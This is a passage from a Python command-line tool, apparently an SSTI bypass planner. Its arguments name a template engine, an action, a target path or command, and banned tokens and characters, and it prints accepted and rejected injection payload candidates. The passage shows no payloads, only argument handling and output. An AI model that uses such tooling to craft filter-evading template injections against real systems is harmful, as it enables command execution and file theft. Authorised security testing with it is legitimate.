    parser.add_argument("--ban-token", action="append", default=[])
    parser.add_argument("--ban-char", action="append", default=[])
    parser.add_argument("--feature", action="append", default=None)
    parser.add_argument("--features-known", action="store_true",
                        help="treat an omitted --feature list as explicitly empty")
    parser.add_argument("--sandbox", choices=SANDBOX_STATES, default="unknown")
    parser.add_argument("--version")
    parser.add_argument("--fact", action="append", default=[])
    parser.add_argument("--json", action="store_true")
    return parser


def main(argv: Sequence[str] | None = None) -> int:
    try:
        try:
            args = _build_parser().parse_args(argv)
        except SystemExit as exc:
            return exc.code if isinstance(exc.code, int) else 2
        features: object | None = args.feature
        if args.features_known and features is None:
            features = ()
        report = plan_ssti_bypasses(
            args.engine,
            args.action,
            marker=args.marker,
            path=args.path,
            command=args.command,
            banned_tokens=args.ban_token,
            banned_characters=args.ban_char,
            enabled_features=features,
            sandbox=args.sandbox,
            version=args.version,
            facts=_fact_assignments(args.fact),
        )
        if args.json:
            print(json.dumps(report, indent=2, sort_keys=True))
        else:
            for heading in ("accepted", "rejected"):
                print(f"== {heading} ==")
                for row in report[heading]:
                    print(f"[{row['status']}] {row['candidate_id']}: {row['payload']}")
                    for blocker in row["blockers"]:
                        print(f"  - {blocker}")
        return 0
    except SSTIBypassInputError as exc:
        print(f"webdepth_ssti_bypass_planner: {exc}", file=sys.stderr)
        return 2
    except (OSError, TypeError, ValueError, KeyError, IndexError, OverflowError,
            UnicodeError, RecursionError, json.JSONDecodeError) as exc:
        print(f"webdepth_ssti_bypass_planner: malformed input: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(main())
